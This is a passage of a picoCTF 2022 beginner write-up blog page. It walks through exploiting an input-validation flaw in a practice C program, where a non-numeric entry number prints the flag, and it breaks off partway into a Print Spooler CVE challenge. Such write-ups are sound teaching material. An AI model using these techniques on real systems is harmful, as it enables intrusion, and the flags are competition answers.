@@ -1,0 +1,1028 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="theme-color" content="#171717">
+    <script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>
+    
+
+    <meta name="description" content="Learn how to capture-the-flag with this compilation of in-depth writeups from picoCTF 2022. Covers introductory-level challenges in all categories!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PicoCTF 2022: Beginner&#39;s Writeup Compilation">
+<meta property="og:url" content="https://enscribe.dev/blog/picoctf-2022/beginners-compilation/index.html">
+<meta property="og:site_name" content="enscribe.dev">
+<meta property="og:description" content="Learn how to capture-the-flag with this compilation of in-depth writeups from picoCTF 2022. Covers introductory-level challenges in all categories!">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://enscribe.dev/static/picoctf-2022/beginners-compilation/banner.png">
+<meta property="article:published_time" content="2022-07-25T19:16:07.000Z">
+<meta property="article:modified_time" content="2023-08-30T22:32:45.005Z">
+<meta property="article:author" content="enscribe">
+<meta property="article:tag" content="compilation">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://enscribe.dev/static/picoctf-2022/beginners-compilation/banner.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/static/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/static/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PicoCTF 2022: Beginner&#39;s Writeup Compilation</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="previous post" href="/blog/dhhutc-2022/port-authority/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="next post" href="/blog/picoctf-2022/buffer-overflow-series/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">previous post</span>
+      <span id="i-next" class="info" style="display:none;">next post</span>
+      <span id="i-top" class="info" style="display:none;">back to top</span>
+      <span id="i-share" class="info" style="display:none;">share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&text=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&title=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&is_video=false&description=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PicoCTF 2022: Beginner&#39;s Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/picoctf-2022/beginners-compilation/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&title=PicoCTF 2022: Beginner&#39;s Writeup Compilation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/picoctf-2022/beginners-compilation/&name=PicoCTF 2022: Beginner&#39;s Writeup Compilation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Binary-Exploitation"><span class="toc-number">1.</span> <span class="toc-text">Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-file-exploit"><span class="toc-number">1.1.</span> <span class="toc-text">basic-file-exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-XXXX-XXXX"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-XXXX-XXXX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ropfu"><span class="toc-number">1.3.</span> <span class="toc-text">ropfu</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptography"><span class="toc-number">2.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-mod1"><span class="toc-number">2.1.</span> <span class="toc-text">basic-mod1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-mod2"><span class="toc-number">2.2.</span> <span class="toc-text">basic-mod2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#credstuff"><span class="toc-number">2.3.</span> <span class="toc-text">credstuff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#morse-code"><span class="toc-number">2.4.</span> <span class="toc-text">morse-code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">3.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enhance!"><span class="toc-number">3.1.</span> <span class="toc-text">Enhance!</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PicoCTF 2022: Beginner&#39;s Writeup Compilation
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">enscribe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-25T19:16:07.000Z" itemprop="datePublished">Jul 25, 2022</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a> › <a class="category-link" href="/categories/blog/picoctf-2022/">picoctf-2022</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/compilation/" rel="tag">compilation</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="/static/picoctf-2022/beginners-compilation/banner.svg" alt="Banner"></p>
+<h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><div class="challenge">
+    <div class="challenge-title"><h3 id="basic-file-exploit" class="chal-title"><a href="#basic-file-exploit" class="headerlink" title="basic-file-exploit"></a>basic-file-exploit</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Will Hong<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn/binary<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/beginners-compilation/program-redacted.c">program-redacted.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat:<br />
+<code>$ nc saturn.picoctf.net 50366</code>
+                <br><details><summary><b>Hints</b>:</summary><br>Try passing in things the program doesn't expect. Like a string instead of a number.<br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>Let’s connect to the server using <code>netcat</code> to see what’s going on:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$</span> nc saturn.picoctf.net 50366
+Hi, welcome to my echo chamber!
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program</pre></td></tr></table></div>
+
+<p>Since this is the binary exploitation category, we’ll be looking for a vulnerability in the source code that allows us to either break or control the program at a lower level. Let’s view the attachment <code>program-redacted.c</code>:</p>
+<div><figure class="highlight c" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>program-redacted.c</span><a href="https://enscribe.dev/static/picoctf-2022/beginners-compilation/program-redacted.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span>
+
+<span class="meta">#<span class="keyword">define</span> WAIT 60</span>
+
+<span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;
+
+<span class="type">static</span> <span class="type">char</span> data[<span class="number">10</span>][<span class="number">100</span>];
+<span class="type">static</span> <span class="type">int</span> input_lengths[<span class="number">10</span>];
+<span class="type">static</span> <span class="type">int</span> inputs = <span class="number">0</span>;
+
+<span class="type">int</span> <span class="title function_">tgetinput</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> l)</span>
+{
+    fd_set          input_set;
+    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">timeout</span>;</span>
+    <span class="type">int</span>             ready_for_reading = <span class="number">0</span>;
+    <span class="type">int</span>             read_bytes = <span class="number">0</span>;
+    
+    <span class="keyword">if</span>( l &lt;= <span class="number">0</span> )
+    {
+      <span class="built_in">printf</span>(<span class="string">&quot;&#x27;l&#x27; for tgetinput must be greater than 0\n&quot;</span>);
+      <span class="keyword">return</span> <span class="number">-2</span>;
+    }
+    
+    
+    <span class="comment">/* Empty the FD Set */</span>
+    FD_ZERO(&amp;input_set );
+    <span class="comment">/* Listen to the input descriptor */</span>
+    FD_SET(STDIN_FILENO, &amp;input_set);
+
+    <span class="comment">/* Waiting for some seconds */</span>
+    timeout.tv_sec = WAIT;    <span class="comment">// WAIT seconds</span>
+    timeout.tv_usec = <span class="number">0</span>;    <span class="comment">// 0 milliseconds</span>
+
+    <span class="comment">/* Listening for input stream for any activity */</span>
+    ready_for_reading = select(<span class="number">1</span>, &amp;input_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);
+    <span class="comment">/* Here, first parameter is number of FDs in the set, 
+     * second is our FD set for reading,
+     * third is the FD set in which any write activity needs to updated,
+     * which is not required in this case. 
+     * Fourth is timeout
+     */</span>
+
+    <span class="keyword">if</span> (ready_for_reading == <span class="number">-1</span>) {
+        <span class="comment">/* Some error has occured in input */</span>
+        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read your input\n&quot;</span>);
+        <span class="keyword">return</span> <span class="number">-1</span>;
+    } 
+
+    <span class="keyword">if</span> (ready_for_reading) {
+        read_bytes = read(<span class="number">0</span>, input, l<span class="number">-1</span>);
+        <span class="keyword">if</span>(input[read_bytes<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>){
+        --read_bytes;
+        input[read_bytes]=<span class="string">&#x27;\0&#x27;</span>;
+        }
+        <span class="keyword">if</span>(read_bytes==<span class="number">0</span>){
+            <span class="built_in">printf</span>(<span class="string">&quot;No data given.\n&quot;</span>);
+            <span class="keyword">return</span> <span class="number">-4</span>;
+        } <span class="keyword">else</span> {
+            <span class="keyword">return</span> <span class="number">0</span>;
+        }
+    } <span class="keyword">else</span> {
+        <span class="built_in">printf</span>(<span class="string">&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;</span>);
+        <span class="keyword">return</span> <span class="number">-3</span>;
+    }
+
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+
+
+<span class="type">static</span> <span class="type">void</span> <span class="title function_">data_write</span><span class="params">()</span> {
+  <span class="type">char</span> input[<span class="number">100</span>];
+  <span class="type">char</span> len[<span class="number">4</span>];
+  <span class="type">long</span> length;
+  <span class="type">int</span> r;
+  
+  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your data:\n&quot;</span>);
+  r = tgetinput(input, <span class="number">100</span>);
+  <span class="comment">// Timeout on user input</span>
+  <span class="keyword">if</span>(r == <span class="number">-3</span>)
+  {
+    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+  
+  <span class="keyword">while</span> (<span class="literal">true</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of your data:\n&quot;</span>);
+    r = tgetinput(len, <span class="number">4</span>);
+    <span class="comment">// Timeout on user input</span>
+    <span class="keyword">if</span>(r == <span class="number">-3</span>)
+    {
+      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);
+      <span class="built_in">exit</span>(<span class="number">0</span>);
+    }
+  
+    <span class="keyword">if</span> ((length = strtol(len, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) {
+      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid length&quot;</span>);
+    } <span class="keyword">else</span> {
+      <span class="keyword">break</span>;
+    }
+  }
+
+  <span class="keyword">if</span> (inputs &gt; <span class="number">10</span>) {
+    inputs = <span class="number">0</span>;
+  }
+
+  <span class="built_in">strcpy</span>(data[inputs], input);
+  input_lengths[inputs] = length;
+
+  <span class="built_in">printf</span>(<span class="string">&quot;Your entry number is: %d\n&quot;</span>, inputs + <span class="number">1</span>);
+  inputs++;
+}
+
+
+<span class="type">static</span> <span class="type">void</span> <span class="title function_">data_read</span><span class="params">()</span> {
+  <span class="type">char</span> entry[<span class="number">4</span>];
+  <span class="type">long</span> entry_number;
+  <span class="type">char</span> output[<span class="number">100</span>];
+  <span class="type">int</span> r;
+
+  <span class="built_in">memset</span>(output, <span class="string">&#x27;\0&#x27;</span>, <span class="number">100</span>);
+  
+  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the entry number of your data:\n&quot;</span>);
+  r = tgetinput(entry, <span class="number">4</span>);
+  <span class="comment">// Timeout on user input</span>
+  <span class="keyword">if</span>(r == <span class="number">-3</span>)
+  {
+    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+  
+  <span class="keyword">if</span> ((entry_number = strtol(entry, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) {
+    <span class="built_in">puts</span>(flag);
+    fseek(<span class="built_in">stdin</span>, <span class="number">0</span>, SEEK_END);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+
+  entry_number--;
+  <span class="built_in">strncpy</span>(output, data[entry_number], input_lengths[entry_number]);
+  <span class="built_in">puts</span>(output);
+}
+
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {
+  <span class="type">char</span> input[<span class="number">3</span>] = {<span class="string">&#x27;\0&#x27;</span>};
+  <span class="type">long</span> command;
+  <span class="type">int</span> r;
+
+  <span class="built_in">puts</span>(<span class="string">&quot;Hi, welcome to my echo chamber!&quot;</span>);
+  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;1&#x27; to enter a phrase into our database&quot;</span>);
+  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;2&#x27; to echo a phrase in our database&quot;</span>);
+  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;3&#x27; to exit the program&quot;</span>);
+
+  <span class="keyword">while</span> (<span class="literal">true</span>) {   
+    r = tgetinput(input, <span class="number">3</span>);
+    <span class="comment">// Timeout on user input</span>
+    <span class="keyword">if</span>(r == <span class="number">-3</span>)
+    {
+      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);
+      <span class="built_in">exit</span>(<span class="number">0</span>);
+    }
+    
+    <span class="keyword">if</span> ((command = strtol(input, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) {
+      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid number&quot;</span>);
+    } <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">1</span>) {
+      data_write();
+      <span class="built_in">puts</span>(<span class="string">&quot;Write successful, would you like to do anything else?&quot;</span>);
+    } <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) {
+      <span class="keyword">if</span> (inputs == <span class="number">0</span>) {
+        <span class="built_in">puts</span>(<span class="string">&quot;No data yet&quot;</span>);
+        <span class="keyword">continue</span>;
+      }
+      data_read();
+      <span class="built_in">puts</span>(<span class="string">&quot;Read successful, would you like to do anything else?&quot;</span>);
+    } <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">3</span>) {
+      <span class="keyword">return</span> <span class="number">0</span>;
+    } <span class="keyword">else</span> {
+      <span class="built_in">puts</span>(<span class="string">&quot;Please type either 1, 2 or 3&quot;</span>);
+      <span class="built_in">puts</span>(<span class="string">&quot;Maybe breaking boundaries elsewhere will be helpful&quot;</span>);
+    }
+  }
+
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</pre></td></tr></table></div>
+
+<p>In the midst of this complex program, we need to figure out where the flag is, and how to trigger it to print:</p>
+<div><figure class="highlight c" style=""><table><tr><td class="gutter"><pre><span class="line">13</span><br><div style="margin:1.2em 0"><span class="line"> </span></div><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;
+<div class="skip-highlight">14-138</div>
+<span class="keyword">if</span> ((entry_number = strtol(entry, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) {
+    <span class="built_in">puts</span>(flag);
+    fseek(<span class="built_in">stdin</span>, <span class="number">0</span>, SEEK_END);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+}</pre></td></tr></table></div>
+
+<p>The flag is defined in line 13 as <code>&quot;[REDACTED]&quot;</code>, which will be the actual location on the remote server. From lines 139-143 it looks like a condition needs to be met in order to <code>puts()</code> the flag, which writes a string to the output stream <code>stdout</code>.</p>
+<p>Google defines <code>strtol()</code> as a function that “converts the initial part of the string in <strong>str</strong> to a <strong>long int</strong> value according to the given <strong>base</strong>“. To break it, we need to input something that is <strong>unconvertible into a long integer</strong>. In this case, it would be a string, as they can’t be properly coalesced into long integers! </p>
+<p>This if statement is located within a function called <code>data_read()</code>. Let’s see where it’s called in the program:</p>
+<div><figure class="highlight c" style=""><table><tr><td class="gutter"><pre><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre>} <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) {
+     <span class="keyword">if</span> (inputs == <span class="number">0</span>) {
+       <span class="built_in">puts</span>(<span class="string">&quot;No data yet&quot;</span>);
+       <span class="keyword">continue</span>;
+     }
+     data_read();
+     <span class="built_in">puts</span>(<span class="string">&quot;Read successful, would you like to do anything else?&quot;</span>);</pre></td></tr></table></div>
+
+<p>After we write some data with the command <code>1</code>, We should be pressing the command <code>2</code> to read from the stored data. Once it prompts us to “enter the entry number of your data”, we’ll send a string instead to break it. Let’s head back to the <code>netcat</code> and test it out:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="gutter"><pre><span class="line"></span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">SERVER</span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">SERVER</span><br><span class="line"></span><br></pre></td><td class="code"><pre><span class="meta prompt_">$</span> nc saturn.picoctf.net 50366
+Hi, welcome to my echo chamber!
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program
+<span class="meta prompt_">></span> 1
+1
+Please enter your data:
+<span class="meta prompt_">></span> hello
+hello
+Please enter the length of your data:
+<span class="meta prompt_">></span> 5
+5
+Your entry number is: 1
+Write successful, would you like to do anything else?
+<span class="meta prompt_">></span> 2
+2
+Please enter the entry number of your data:
+<span class="meta prompt_">></span> "NO!"
+"NO!"
+<div class="code-highlight">picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_<span style="color:#696969"><b>[REDACTED]</b></span>}</div></pre></td></tr></table></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h3 id="CVE-XXXX-XXXX" class="chal-title"><a href="#CVE-XXXX-XXXX" class="headerlink" title="CVE-XXXX-XXXX"></a>CVE-XXXX-XXXX</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Mubarak Mikail<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: osint, pwn (?)<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                Enter the CVE of the vulnerability as the flag with the correct flag format - <code>picoCTF{CVE-XXXX-XXXXX}</code> - replacing <code>XXXX-XXXXX</code> with the numbers for the matching vulnerability. The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.
